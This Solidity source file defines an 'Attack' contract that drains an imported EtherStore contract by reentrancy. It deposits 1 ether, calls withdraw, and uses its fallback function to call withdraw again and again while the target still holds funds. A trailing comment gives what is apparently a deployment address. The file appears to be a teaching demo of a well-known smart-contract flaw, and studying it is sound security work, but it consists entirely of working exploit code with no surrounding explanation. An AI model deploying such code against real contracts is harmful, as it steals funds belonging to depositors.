// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./EtherStore.sol";

contract Attack {

    event attackCalled(address addr);
    event attackSuccess(address addr);
    event fallbackCalled(address addr);
    event fallbackSuccess(address addr);

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        emit fallbackCalled(msg.sender);
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
        emit fallbackSuccess(msg.sender);

    }

    function attack() external payable {
        emit attackCalled(msg.sender);
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
        emit attackSuccess(msg.sender);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

//0x329d9ad6c0dF982f9204617660B47499ED17582C